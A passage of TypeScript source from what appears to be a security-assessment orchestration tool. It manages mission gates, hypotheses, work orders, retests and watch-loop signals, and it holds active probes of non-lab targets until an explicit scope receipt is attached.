      status: openWorkOrders.length ? 'warn' : 'ok',
      detail: `${workOrders.length} work order(s), ${openWorkOrders.length} open`,
    },
    {
      id: 'retests',
      label: 'Retest state',
      status: findings.length && !findingsWithoutRetest.length && retests.length && !unresolvedRetests.length ? 'ok' : findings.length ? 'warn' : 'warn',
      detail: `${retests.length} retest(s), ${findingsWithoutRetest.length} finding(s) without retest, ${unresolvedRetests.length} unresolved`,
    },
    {
      id: 'egress',
      label: 'Egress policy',
      status: isLoopbackOrLabTarget(target) || freshMissionApprovals.length ? 'ok' : 'warn',
      detail: isLoopbackOrLabTarget(target) ? 'Loopback/local target.' : 'External actions require fresh mission approval.',
    },
  ];
  const okCount = checks.filter(check => check.status === 'ok').length;
  const blockCount = checks.filter(check => check.status === 'block').length;
  const score = Math.round((okCount / checks.length) * 100);
  const readinessHold = Boolean(!hypotheses.length || !findings.length || openWorkOrders.length || findingsWithoutRetest.length || findingsWithoutStrongEvidence.length || unresolvedRetests.length);
  const status = blockCount ? 'blocked' : score >= 80 && freshMissionApprovals.length && !readinessHold ? 'ready' : 'hold';
  return {
    schema_version: 't3mp3st_mission_gate/v1',
    generatedAt: nowIso(),
    family,
    missionId: missionId || null,
    operationId: operationId || null,
    target,
    status,
    score,
    missionSummary: {
      hypotheses: hypotheses.length,
      routeFamilyHypotheses: routeFamilyHypotheses.length,
      workOrders: workOrders.length,
      findings: findings.length,
      retests: retests.length,
      evidenceProvenance,
      findingsWithoutStrongEvidence: findingsWithoutStrongEvidence.length,
      activeLanes: activeLaneCount,
      laneSummary,
      freshMissionApprovals: freshMissionApprovals.length,
      freshCommandApprovals: freshCommandApprovals.length,
      clientScopeAuthorized,
    },
    checks,
    nextActions: checks
      .filter(check => check.status !== 'ok')
      .map(check => check.id === 'authorization'
        ? 'Request or attach a fresh receipt before active execution.'
        : check.id === 'evidence'
          ? 'Log strong evidence before hardening claims.'
          : check.id === 'claim_hardening'
            ? 'Seed hypotheses and promote evidence-backed claims before readiness.'
          : check.id === 'findings'
            ? 'Attach tool, receipt, or replayable artifact evidence to every finding before readiness.'
          : check.id === 'hunt_queue'
            ? 'Complete or block all open work orders before readiness.'
          : check.id === 'retests'
            ? 'Pass, fail, or block retests before readiness.'
            : `Resolve gate: ${check.label}`),
  };
}

function scopedHypotheses(missionId = '', operationId = '', family?: MissionFamily): HypothesisRecord[] {
  return [...hypothesisLedger.values()]
    .filter(hypothesis => !missionId || hypothesis.missionId === missionId)
    .filter(hypothesis => !operationId || hypothesis.operationId === operationId)
    .filter(hypothesis => !family || hypothesis.family === family)
    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
}

function scopedWorkOrders(missionId = '', operationId = '', family?: MissionFamily): WorkOrderRecord[] {
  return [...workOrderLedger.values()]
    .filter(order => !missionId || order.missionId === missionId)
    .filter(order => !operationId || order.operationId === operationId)
    .filter(order => !family || order.family === family)
    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
}

function missionLaneSummary(params: {
  hypotheses?: HypothesisRecord[];
  workOrders?: WorkOrderRecord[];
  findings?: FindingRecord[];
  retests?: RetestRecord[];
}): Array<{
  family: MissionFamily;
  hypotheses: number;
  workOrders: number;
  openWorkOrders: number;
  findings: number;
  openFindings: number;
  retests: number;
  unresolvedRetests: number;
}> {
  const families = new Set<MissionFamily>();
  for (const hypothesis of params.hypotheses || []) families.add(hypothesis.family);
  for (const order of params.workOrders || []) families.add(order.family);
  for (const finding of params.findings || []) families.add(finding.family);
  const findingsById = new Map((params.findings || []).map(finding => [finding.id, finding]));
  for (const retest of params.retests || []) {
    const finding = findingsById.get(retest.findingId);
    if (finding) families.add(finding.family);
  }

  return [...families].sort().map(family => {
    const familyHypotheses = (params.hypotheses || []).filter(hypothesis => hypothesis.family === family);
    const familyWorkOrders = (params.workOrders || []).filter(order => order.family === family);
    const familyFindings = (params.findings || []).filter(finding => finding.family === family);
    const familyFindingIds = new Set(familyFindings.map(finding => finding.id));
    const familyRetests = (params.retests || []).filter(retest => familyFindingIds.has(retest.findingId));
    return {
      family,
      hypotheses: familyHypotheses.length,
      workOrders: familyWorkOrders.length,
      openWorkOrders: familyWorkOrders.filter(order => !['completed', 'blocked'].includes(order.status)).length,
      findings: familyFindings.length,
      openFindings: familyFindings.filter(finding => !['resolved', 'false_positive'].includes(finding.status)).length,
      retests: familyRetests.length,
      unresolvedRetests: familyRetests.filter(retest => retest.status !== 'passed').length,
    };
  });
}

function latestMissionContext(): Record<string, unknown> {
  const records = [
    ...[...hypothesisLedger.values()].map(record => ({ ts: record.updatedAt || record.createdAt, missionId: record.missionId, operationId: record.operationId, family: record.family, kind: 'hypothesis', id: record.id })),
    ...[...workOrderLedger.values()].map(record => ({ ts: record.updatedAt || record.createdAt, missionId: record.missionId, operationId: record.operationId, family: record.family, kind: 'work_order', id: record.id })),
    ...[...evidenceLedger.values()].map(record => ({ ts: record.createdAt, missionId: record.missionId, operationId: record.operationId, family: undefined as MissionFamily | undefined, kind: 'evidence', id: record.id })),
    ...[...findingsLedger.values()].map(record => ({ ts: record.updatedAt || record.createdAt, missionId: record.missionId, operationId: record.operationId, family: record.family, kind: 'finding', id: record.id })),
    ...[...retestLedger.values()].map(record => ({ ts: record.updatedAt || record.createdAt, missionId: record.missionId, operationId: record.operationId, family: undefined as MissionFamily | undefined, kind: 'retest', id: record.id })),
  ]
    .filter(record => record.missionId || record.operationId)
    .sort((a, b) => String(b.ts || '').localeCompare(String(a.ts || '')));

  const latest = records[0];
  if (!latest) {
    return {
      schema_version: 't3mp3st_mission_context/v1',
      missionId: null,
      operationId: null,
      family: null,
      counts: { hypotheses: 0, workOrders: 0, evidence: 0, findings: 0, retests: 0 },
      laneSummary: [],
      latestRecord: null,
    };
  }

  const missionId = latest.missionId || '';
  const operationId = latest.operationId || '';
  const hypotheses = scopedHypotheses(missionId, operationId);
  const hypothesisIds = new Set(hypotheses.map(hypothesis => hypothesis.id));
  const workOrders = scopedWorkOrders(missionId, operationId)
    .filter(order => !hypothesisIds.size || hypothesisIds.has(order.hypothesisId));
  const evidence = [...evidenceLedger.values()].filter(entry =>
    (!missionId || entry.missionId === missionId) && (!operationId || entry.operationId === operationId)
  );
  const findings = [...findingsLedger.values()].filter(finding =>
    (!missionId || finding.missionId === missionId) && (!operationId || finding.operationId === operationId)
  );
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) ||
    ((!missionId || retest.missionId === missionId) && (!operationId || retest.operationId === operationId))
  );
  const laneSummary = missionLaneSummary({ hypotheses, workOrders, findings, retests });

  return redactSecrets({
    schema_version: 't3mp3st_mission_context/v1',
    missionId: missionId || null,
    operationId: operationId || null,
    family: latest.family || laneSummary[0]?.family || null,
    counts: {
      hypotheses: hypotheses.length,
      workOrders: workOrders.length,
      evidence: evidence.length,
      findings: findings.length,
      retests: retests.length,
    },
    laneSummary,
    latestRecord: {
      id: latest.id,
      kind: latest.kind,
      ts: latest.ts,
    },
  }) as Record<string, unknown>;
}

function workOrderSquadForFamily(family: MissionFamily): string {
  const squads: Record<MissionFamily, string> = {
    web_api: 'web-api',
    ai_red_team: 'ai-agent',
    cloud_infra: 'infra-cloud',
    smart_contract: 'crypto-contract',
    code_supply_chain: 'packages',
    crypto_secrets: 'crypto-secrets',
    reverse_binary: 'reverse',
    agent_warfare: 'ai-agent',
    social_osint: 'osint',
    reporting_remediation: 'reporting',
  };
  return squads[family] || 'operator';
}

function workOrderToolHints(family: MissionFamily, kind: WorkOrderKind): string[] {
  const familyHints = adaptersForFamily(family)
    .filter(adapter => adapter.execution !== 'catalog_only' && adapter.execution !== 'import_only')
    .map(adapter => adapter.binary)
    .slice(0, 4);
  const kindHints: Record<WorkOrderKind, string[]> = {
    prove: ['file', 'curl'],
    disprove: ['curl', 'dig'],
    map_impact: ['whois', 'dig'],
    owner_control: ['git', 'file'],
    retest_design: ['file'],
    tool_probe: familyHints,
  };
  return uniqueStrings([...(kindHints[kind] || []), ...familyHints]).slice(0, 5);
}

function defaultWorkOrderStatus(target: string, kind: WorkOrderKind): WorkOrderStatus {
  const requiresReceipt = kind === 'tool_probe' && !isLoopbackOrLabTarget(target);
  return requiresReceipt ? 'needs_receipt' : 'queued';
}

function createWorkOrder(input: Partial<WorkOrderRecord> & Record<string, unknown>, hypothesis: HypothesisRecord): WorkOrderRecord {
  const now = nowIso();
  const kind = normalizeWorkOrderKind(input.kind);
  const target = input.target === undefined ? hypothesis.target : normalizeTargetValue(input.target);
  const requiresReceipt = input.requiresReceipt === undefined
    ? kind === 'tool_probe' && !isLoopbackOrLabTarget(target)
    : Boolean(input.requiresReceipt);
  return {
    id: typeof input.id === 'string' ? input.id : newId('work'),
    hypothesisId: hypothesis.id,
    missionId: typeof input.missionId === 'string' ? input.missionId : hypothesis.missionId,
    operationId: typeof input.operationId === 'string' ? input.operationId : hypothesis.operationId,
    family: input.family === undefined ? hypothesis.family : normalizeMissionFamily(input.family, hypothesis.family),
    squad: typeof input.squad === 'string' && input.squad.trim() ? input.squad.trim() : workOrderSquadForFamily(hypothesis.family),
    kind,
    title: typeof input.title === 'string' && input.title.trim() ? input.title.trim() : `${kind.replace(/_/g, ' ')}: ${hypothesis.claim.slice(0, 72)}`,
    objective: typeof input.objective === 'string' && input.objective.trim() ? input.objective.trim() : 'Collect bounded evidence that can support or weaken this hypothesis.',
    target,
    allowedActions: normalizeStringList(input.allowedActions).length
      ? normalizeStringList(input.allowedActions)
      : ['read_only_assessment', 'evidence_planning', 'report_draft'],
    requiresReceipt,
    toolHints: normalizeStringList(input.toolHints).length ? normalizeStringList(input.toolHints) : workOrderToolHints(hypothesis.family, kind),
    status: normalizeWorkOrderStatus(input.status, requiresReceipt ? 'needs_receipt' : defaultWorkOrderStatus(target, kind)),
    evidenceIds: normalizeStringList(input.evidenceIds).filter(id => evidenceLedger.has(id)),
    resultSummary: typeof input.resultSummary === 'string' ? redactLedgerText(input.resultSummary) : undefined,
    createdAt: now,
    updatedAt: now,
    completedAt: typeof input.completedAt === 'string' ? input.completedAt : undefined,
  };
}

/**
 * decomposeHypothesis — SYNCHRONOUS hypothesis -> work-order splitter.
 *
 * NAMING NOTE: this is NOT the multi-model DecompositionOrchestrator
 * (src/orchestration). It does no LLM work — it deterministically fans a single
 * hypothesis out into a fixed set of bounded work orders (prove / disprove /
 * map_impact / owner_control / retest_design / tool_probe). The word "decompose"
 * is shared but the machinery is unrelated.
 */
function decomposeHypothesis(hypothesis: HypothesisRecord): WorkOrderRecord[] {
  const target = hypothesis.target || 'local-lab';
  const squad = workOrderSquadForFamily(hypothesis.family);
  const templates: Array<Partial<WorkOrderRecord> & Record<string, unknown>> = [
    {
      kind: 'prove',
      title: 'Prove or bound the claim',
      objective: `Collect one concrete artifact that would support: ${hypothesis.claim}`,
      squad,
      allowedActions: ['read_only_assessment', 'artifact_collection', 'report_draft'],
    },
    {
      kind: 'disprove',
      title: 'Try to falsify it',
      objective: 'Look for contradictory evidence, normal behavior, compensating controls, or missing preconditions.',
      squad: 'critic',
      allowedActions: ['read_only_assessment', 'false_positive_review', 'report_draft'],
    },
    {
      kind: 'map_impact',
      title: 'Map blast radius',
      objective: 'Identify affected assets, trust boundaries, data classes, owners, and realistic impact without active exploitation.',
      squad,
      allowedActions: ['asset_mapping', 'evidence_planning', 'report_draft'],
    },
    {
      kind: 'owner_control',
      title: 'Name owner and control',
      objective: 'Turn the hypothesis into an owner-actionable control gap, fix path, and acceptance criteria.',
      squad: 'reporting',
      allowedActions: ['owner_mapping', 'fix_planning', 'report_draft'],
    },
    {
      kind: 'retest_design',
      title: 'Design the retest',
      objective: 'Write the minimum retest that proves the fix or clearly preserves residual risk.',
      squad: 'retest',
      allowedActions: ['retest_design', 'acceptance_criteria', 'report_draft'],
    },
    {
      kind: 'tool_probe',
      title: 'Stage a gated tool probe',
      objective: isLoopbackOrLabTarget(target)
        ? 'Prepare a local/read-only tool check and bind its output to evidence.'
        : 'Prepare the tool check, but hold execution until a fresh scope receipt is attached.',
      squad,
      allowedActions: isLoopbackOrLabTarget(target)
        ? ['local_read_only_probe', 'artifact_collection']
        : ['receipt_required_probe', 'evidence_planning'],
      requiresReceipt: !isLoopbackOrLabTarget(target),
    },
  ];
  return templates
    .filter(template => ![...workOrderLedger.values()].some(order => order.hypothesisId === hypothesis.id && order.kind === template.kind))
    .map(template => createWorkOrder({ ...template, target }, hypothesis));
}

function watchScope(params: Record<string, unknown>): { missionId: string; operationId: string; family?: MissionFamily; target: string } {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const missionId = typeof params.missionId === 'string'
    ? params.missionId
    : typeof operationDraft.mission_id === 'string' ? operationDraft.mission_id : '';
  const operationId = typeof params.operationId === 'string'
    ? params.operationId
    : typeof operationDraft.operation_id === 'string' ? operationDraft.operation_id : '';
  const family = typeof params.family === 'string'
    ? normalizeMissionFamily(params.family, 'web_api')
    : typeof operationDraft.family === 'string' ? normalizeMissionFamily(operationDraft.family, 'web_api') : undefined;
  const target = params.target === undefined
    ? normalizeTargetValue(operationDraft.target || 'local-lab')
    : normalizeTargetValue(params.target);
  return { missionId, operationId, family, target };
}

function buildWatchSignal(input: Omit<WatchSignalRecord, 'id' | 'createdAt'>): WatchSignalRecord {
  return {
    ...input,
    id: newId('signal'),
    createdAt: nowIso(),
  };
}

function latestWatchCycles(missionId = '', operationId = '', family?: MissionFamily): WatchCycleRecord[] {
  return [...watchCycleLedger.values()]
    .filter(cycle => !missionId || cycle.missionId === missionId)
    .filter(cycle => !operationId || cycle.operationId === operationId)
    .filter(cycle => !family || cycle.family === family)
    .sort((a, b) => b.createdAt.localeCompare(a.createdAt));
}

function buildWatchSignals(scope: { missionId: string; operationId: string; family?: MissionFamily; target: string }): WatchSignalRecord[] {
  const hypotheses = scopedHypotheses(scope.missionId, scope.operationId);
  const routeFamilyHypotheses = scope.family ? scopedHypotheses(scope.missionId, scope.operationId, scope.family) : hypotheses;
  const hypothesisIds = new Set(hypotheses.map(hypothesis => hypothesis.id));
  const workOrders = scopedWorkOrders(scope.missionId, scope.operationId)
    .filter(order => !hypothesisIds.size || hypothesisIds.has(order.hypothesisId));
  const evidence = [...evidenceLedger.values()]
    .filter(entry => !scope.missionId || entry.missionId === scope.missionId)
    .filter(entry => !scope.operationId || entry.operationId === scope.operationId);
  const findings = [...findingsLedger.values()]
    .filter(finding => !scope.missionId || finding.missionId === scope.missionId)
    .filter(finding => !scope.operationId || finding.operationId === scope.operationId);
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) ||
    ((!scope.missionId || retest.missionId === scope.missionId) && (!scope.operationId || retest.operationId === scope.operationId))
  );
  const laneSummary = missionLaneSummary({ hypotheses, workOrders, findings, retests });
  const signals: WatchSignalRecord[] = [];
  const base = {
    missionId: scope.missionId || undefined,
    operationId: scope.operationId || undefined,
    family: scope.family,
  };

  if (!hypotheses.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'no_hypothesis',
      severity: evidence.length ? 'action' : 'watch',
      title: 'No active hypothesis',
      detail: evidence.length
        ? `${evidence.length} evidence item(s) exist without an explicit reasoning target.`
        : 'The watch loop needs a hypothesis before it can coordinate a hunt queue.',
      recommendedAction: evidence.length ? 'Seed a hypothesis from current evidence.' : 'Seed a hypothesis from the mission contract.',
      relatedHypothesisIds: [],
      relatedWorkOrderIds: [],
      relatedFindingIds: [],
    }));
  }

  if (laneSummary.length > 1) {
    const laneDetail = laneSummary
      .map(lane => `${lane.family}:${lane.hypotheses}H/${lane.workOrders}T/${lane.findings}F`)
      .join(', ');
    signals.push(buildWatchSignal({
      ...base,
      type: 'multi_family_active',
      severity: 'info',
      title: 'Multi-lane hunt active',
      detail: `${hypotheses.length} mission hypothesis item(s) span ${laneSummary.length} specialist lane(s). Route family has ${routeFamilyHypotheses.length}. ${laneDetail}`,
      recommendedAction: 'Coordinate the lane summaries before judging readiness; do not let one route family hide another specialist lane.',
      relatedHypothesisIds: hypotheses.map(item => item.id),
      relatedWorkOrderIds: workOrders.map(item => item.id),
      relatedFindingIds: findings.map(item => item.id),
    }));
  }

  const unsupported = hypotheses.filter(hypothesis => !hypothesis.evidenceForIds.length && !hypothesis.evidenceAgainstIds.length);
  if (unsupported.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'unsupported_hypothesis',
      severity: 'action',
      title: 'Hypothesis lacks evidence pressure',
      detail: `${unsupported.length} hypothesis item(s) need support or contradiction before promotion.`,
      recommendedAction: 'Complete prove/disprove work orders or attach evidence directly.',
      relatedHypothesisIds: unsupported.map(item => item.id),
      relatedWorkOrderIds: [],
      relatedFindingIds: [],
    }));
  }

  const undecomposed = hypotheses.filter(hypothesis => !workOrders.some(order => order.hypothesisId === hypothesis.id));
  if (undecomposed.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'undecomposed_hypothesis',
      severity: 'action',
      title: 'Hypothesis has no hunt queue',
      detail: `${undecomposed.length} hypothesis item(s) have not been split into specialist tasks.`,
      recommendedAction: 'Decompose hypotheses into prove, disprove, impact, owner, retest, and tool-probe work orders.',
      relatedHypothesisIds: undecomposed.map(item => item.id),
      relatedWorkOrderIds: [],
      relatedFindingIds: [],
    }));
  }

  const openOrders = workOrders.filter(order => !['completed', 'blocked'].includes(order.status));
  if (openOrders.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'open_work_orders',
      severity: 'watch',
      title: 'Hunt queue still has open tasks',
      detail: `${openOrders.length} work order(s) remain queued, ready, running, or receipt-gated.`,
      recommendedAction: 'Complete the next safe work order or mark blocked with a reason.',
      relatedHypothesisIds: uniqueStrings(openOrders.map(order => order.hypothesisId)),
      relatedWorkOrderIds: openOrders.map(order => order.id),
      relatedFindingIds: [],
    }));
  }

  const receiptOrders = workOrders.filter(order => order.status === 'needs_receipt' || order.requiresReceipt);
  if (receiptOrders.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'receipt_required',
      severity: 'block',
      title: 'Receipt required before active probe',
      detail: `${receiptOrders.length} work order(s) are gated because the target is not local/lab-safe or the task asks for active probing.`,
      recommendedAction: 'Attach explicit scope receipt or keep the task as evidence planning only.',
      relatedHypothesisIds: uniqueStrings(receiptOrders.map(order => order.hypothesisId)),
      relatedWorkOrderIds: receiptOrders.map(order => order.id),
      relatedFindingIds: [],
    }));
  }

  const missingDisproof = hypotheses.filter(hypothesis => !workOrders.some(order =>
    order.hypothesisId === hypothesis.id && order.kind === 'disprove' && order.status === 'completed'
  ));
  if (missingDisproof.length && workOrders.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'missing_disproof',
      severity: 'action',
      title: 'Disproof lane still missing',
      detail: `${missingDisproof.length} hypothesis item(s) need a completed contradiction/false-positive pass.`,
      recommendedAction: 'Complete at least one disprove work order before promotion.',
      relatedHypothesisIds: missingDisproof.map(item => item.id),
      relatedWorkOrderIds: workOrders.filter(order => order.kind === 'disprove').map(order => order.id),
      relatedFindingIds: [],
    }));
  }

  const supportedUnpromoted = hypotheses.filter(hypothesis => hypothesis.status === 'supported' && !hypothesis.findingIds.length);
  if (supportedUnpromoted.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'supported_unpromoted',
      severity: 'action',
      title: 'Supported hypothesis waiting for decision',
      detail: `${supportedUnpromoted.length} supported hypothesis item(s) should be promoted or explicitly rejected.`,
      recommendedAction: 'Promote to finding only after disproof and retest criteria are present.',
      relatedHypothesisIds: supportedUnpromoted.map(item => item.id),
      relatedWorkOrderIds: [],
      relatedFindingIds: [],
    }));
  }

  const findingsWithoutRetest = findings.filter(finding => !finding.retestIds.length);
  if (findingsWithoutRetest.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'finding_needs_retest',
      severity: 'action',
      title: 'Finding needs retest path',
      detail: `${findingsWithoutRetest.length} finding(s) need retest criteria or queued validation.`,
      recommendedAction: 'Queue retests and bind them to fresh evidence.',
      relatedHypothesisIds: [],
      relatedWorkOrderIds: [],
      relatedFindingIds: findingsWithoutRetest.map(item => item.id),
    }));
  }

  const unresolvedRetests = retests.filter(retest => retest.status !== 'passed');
  if (unresolvedRetests.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'retest_unresolved',
      severity: 'watch',
      title: 'Retest unresolved',
      detail: `${unresolvedRetests.length} retest(s) still need pass/fail/block decision.`,
      recommendedAction: 'Complete retests or preserve residual risk in the report.',
      relatedHypothesisIds: [],
      relatedWorkOrderIds: [],
      relatedFindingIds: uniqueStrings(unresolvedRetests.map(retest => retest.findingId)),
    }));
  }

  const pendingMemory = [...memoryProposals.values()].filter(proposal =>
    proposal.status === 'pending' &&
    (!scope.missionId || proposal.sourceMissionId === scope.missionId) &&
    (!scope.operationId || proposal.sourceOperationId === scope.operationId)
  );
  if (pendingMemory.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'memory_pending',
      severity: 'info',
      title: 'Learning proposal waiting',
      detail: `${pendingMemory.length} memory proposal(s) are waiting for operator acceptance or rejection.`,
      recommendedAction: 'Review learning proposals before calling the loop fully learned.',
      relatedHypothesisIds: [],
      relatedWorkOrderIds: [],
      relatedFindingIds: [],
    }));
  }

  if (!signals.length) {
    signals.push(buildWatchSignal({
      ...base,
      type: 'quiet',
      severity: 'info',
      title: 'Watch loop quiet',
      detail: 'No open claim-hardening gaps found in this scoped mission pulse.',
      recommendedAction: 'Keep monitoring or start a new hypothesis from fresh surface changes.',
      relatedHypothesisIds: [],
      relatedWorkOrderIds: [],
      relatedFindingIds: [],
    }));
  }

  return signals;
}

function runWatchLoop(params: Record<string, unknown>): WatchCycleRecord {
  const scope = watchScope(params);
  const spawnWorkOrders = params.spawnWorkOrders === true;
  const spawnedWorkOrderIds: string[] = [];
  if (spawnWorkOrders) {
    for (const hypothesis of scopedHypotheses(scope.missionId, scope.operationId).filter(item => !['promoted', 'rejected'].includes(item.status))) {
      for (const order of decomposeHypothesis(hypothesis)) {
        workOrderLedger.set(order.id, order);
        spawnedWorkOrderIds.push(order.id);
      }
    }
  }
  const signals = buildWatchSignals(scope);
  const blocks = signals.filter(signal => signal.severity === 'block').length;
  const actions = signals.filter(signal => signal.severity === 'action').length;
  const watches = signals.filter(signal => signal.severity === 'watch').length;
  const nextPulseSeconds = blocks ? 60 : actions ? 180 : watches ? 300 : 900;
  const cycle: WatchCycleRecord = {
    id: newId('watch'),
    missionId: scope.missionId || undefined,
    operationId: scope.operationId || undefined,
    family: scope.family,
    target: scope.target,
    createdAt: nowIso(),
    spawnedWorkOrderIds,
    summary: {
      signals: signals.length,
      blocks,
      actions,
      watches,
      spawnedWorkOrders: spawnedWorkOrderIds.length,
      nextPulseSeconds,
    },
    signals,
    nextActions: uniqueStrings([
      spawnedWorkOrderIds.length ? `Review ${spawnedWorkOrderIds.length} newly spawned work order(s).` : '',
      ...signals.map(signal => signal.recommendedAction),
    ]),
  };
  watchCycleLedger.set(cycle.id, cycle);
  emitContractEvent('watch_loop.pulsed', { watchCycleId: cycle.id, missionId: cycle.missionId, signals: signals.length, spawnedWorkOrders: spawnedWorkOrderIds.length });
  return cycle;
}

function watchSignalSignature(signals: WatchSignalRecord[]): string {
  return signals
    .map(signal => [
      signal.type,
      signal.severity,
      ...signal.relatedHypothesisIds,
      ...signal.relatedWorkOrderIds,
      ...signal.relatedFindingIds,
    ].join(':'))
    .sort()
    .join('|');
}

function buildSelfHealAction(input: Omit<SelfHealActionRecord, 'id' | 'applied'> & { applied?: boolean }): SelfHealActionRecord {
  return {
    ...input,
    id: newId('heal'),
    applied: input.applied === true,
  };
}

async function buildSelfHealReport(params: Record<string, unknown>): Promise<Record<string, unknown>> {
  const scope = watchScope(params);
  const apply = params.apply === true || params.applySafe === true;
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {
      mission_id: scope.missionId,
      operation_id: scope.operationId,
      family: scope.family,
      target: { locator: scope.target },
      scope: { authorized: isLoopbackOrLabTarget(scope.target) },
    };
  const family = scope.family || normalizeMissionFamily(operationDraft.family, 'web_api');
  const hypotheses = scopedHypotheses(scope.missionId, scope.operationId);
  const hypothesisIds = new Set(hypotheses.map(hypothesis => hypothesis.id));
  const workOrders = scopedWorkOrders(scope.missionId, scope.operationId)
    .filter(order => !hypothesisIds.size || hypothesisIds.has(order.hypothesisId));
  const findings = [...findingsLedger.values()]
    .filter(finding => !scope.missionId || finding.missionId === scope.missionId)
    .filter(finding => !scope.operationId || finding.operationId === scope.operationId);
  const findingIds = new Set(findings.map(finding => finding.id));
  const retests = [...retestLedger.values()].filter(retest =>
    findingIds.has(retest.findingId) ||
    ((!scope.missionId || retest.missionId === scope.missionId) && (!scope.operationId || retest.operationId === scope.operationId))
  );
  const openWorkOrders = workOrders.filter(order => !['completed', 'blocked'].includes(order.status));
  const receiptWorkOrders = workOrders.filter(order => order.status === 'needs_receipt' || order.requiresReceipt);
  const unresolvedRetests = retests.filter(retest => retest.status !== 'passed');
  const pendingMemory = [...memoryProposals.values()].filter(proposal =>
    proposal.status === 'pending' &&
    (!scope.missionId || proposal.sourceMissionId === scope.missionId) &&
    (!scope.operationId || proposal.sourceOperationId === scope.operationId)
  );
  const currentSignals = buildWatchSignals(scope);
  const latestCycle = latestWatchCycles(scope.missionId, scope.operationId, family)[0] || null;
  const staleWatch = !latestCycle || watchSignalSignature(latestCycle.signals) !== watchSignalSignature(currentSignals);
  const arsenalStatus = await buildArsenalStatus(family);
  const missingCommandReady = Array.isArray(arsenalStatus.missingCommandReady) ? arsenalStatus.missingCommandReady.map(String) : [];
  const highValueMissing = missingCommandReady.filter(tool => ['nmap', 'nuclei', 'ffuf', 'subfinder', 'httpx', 'katana', 'semgrep', 'gitleaks', 'trivy', 'promptfoo', 'garak', 'slither'].includes(tool));
  const gate = buildMissionGate(operationDraft);
  const actions: SelfHealActionRecord[] = [];
  let appliedWatchCycle: WatchCycleRecord | null = null;

  if (staleWatch) {
    appliedWatchCycle = apply ? runWatchLoop({ ...scope, spawnWorkOrders: false }) : null;
    actions.push(buildSelfHealAction({
      type: 'pulse_watch_loop',
      severity: latestCycle ? 'watch' : 'action',
      title: latestCycle ? 'Watch Loop stale' : 'Watch Loop missing pulse',
      detail: latestCycle
        ? 'The latest watch cycle no longer matches the current mission ledger.'
        : 'This mission has not been pulsed yet.',
      recommendedAction: 'Pulse the Watch Loop so the operator sees current gaps.',
      canApply: true,
      applied: Boolean(appliedWatchCycle),
      relatedIds: latestCycle ? [latestCycle.id] : [],
    }));
  }

  for (const signal of currentSignals.filter(signal => ['action', 'block'].includes(signal.severity))) {
    if (signal.type === 'no_hypothesis' || signal.type === 'unsupported_hypothesis') {
      actions.push(buildSelfHealAction({
        type: 'seed_hypothesis',
        severity: signal.severity === 'block' ? 'block' : 'action',
        title: signal.title,
        detail: signal.detail,
        recommendedAction: signal.recommendedAction,
        canApply: false,
        relatedIds: signal.relatedHypothesisIds,
      }));
    } else if (signal.type === 'undecomposed_hypothesis') {
      actions.push(buildSelfHealAction({
        type: 'decompose_hypothesis',
        severity: 'action',
        title: signal.title,
        detail: signal.detail,
        recommendedAction: signal.recommendedAction,
        canApply: false,
        relatedIds: signal.relatedHypothesisIds,
      }));
    } else if (signal.type === 'supported_unpromoted' || signal.type === 'finding_needs_retest' || signal.type === 'missing_disproof') {
      actions.push(buildSelfHealAction({
        type: signal.type === 'finding_needs_retest' ? 'complete_retest' : 'complete_work_order',
        severity: 'action',
        title: signal.title,
        detail: signal.detail,
        recommendedAction: signal.recommendedAction,
        canApply: false,
        relatedIds: [...signal.relatedHypothesisIds, ...signal.relatedFindingIds, ...signal.relatedWorkOrderIds],
      }));
    }
  }

  if (openWorkOrders.length) {
    actions.push(buildSelfHealAction({
      type: 'complete_work_order',
      severity: receiptWorkOrders.length ? 'block' : 'action',
      title: 'Open hunt queue',
      detail: `${openWorkOrders.length} work order(s) still need completion or a block decision.`,
      recommendedAction: receiptWorkOrders.length
        ? 'Attach a scope receipt for gated tasks or keep them as planning-only.'
        : 'Complete the next queued work order and bind output to evidence.',
      canApply: false,
      relatedIds: openWorkOrders.map(order => order.id),
    }));
  }

  if (receiptWorkOrders.length) {
    actions.push(buildSelfHealAction({
      type: 'request_receipt',
      severity: 'block',
      title: 'Receipt-gated task waiting',
      detail: `${receiptWorkOrders.length} work order(s) require explicit approval before active probing.`,
      recommendedAction: 'Request or attach a ScopeGuard receipt before execution.',
      canApply: false,
      relatedIds: receiptWorkOrders.map(order => order.id),
    }));
  }

  if (unresolvedRetests.length) {
    actions.push(buildSelfHealAction({
      type: 'complete_retest',
      severity: 'action',
      title: 'Retest unresolved',
      detail: `${unresolvedRetests.length} retest(s) are queued, failed, or blocked.`,
      recommendedAction: 'Run or explicitly block retests before calling the mission ready.',
      canApply: false,
      relatedIds: unresolvedRetests.map(retest => retest.id),
    }));
  }

  if (gate.status === 'ready' && unresolvedRetests.length) {
    actions.push(buildSelfHealAction({
      type: 'hold_gate',
      severity: 'block',
      title: 'Gate would be premature',
      detail: 'A READY decision would be unsafe while retests are unresolved.',
      recommendedAction: 'Hold mission readiness until retests pass or residual risk is explicit.',
      canApply: false,
      relatedIds: unresolvedRetests.map(retest => retest.id),
    }));
  }

  if (highValueMissing.length) {
    actions.push(buildSelfHealAction({
      type: 'install_tool',
      severity: 'watch',
      title: 'Arsenal gap detected',
      detail: `Missing high-value adapter(s): ${highValueMissing.slice(0, 5).join(', ')}${highValueMissing.length > 5 ? '...' : ''}.`,
      recommendedAction: 'Use installed fallbacks for this run and install missing tools before deeper coverage.',
      canApply: false,
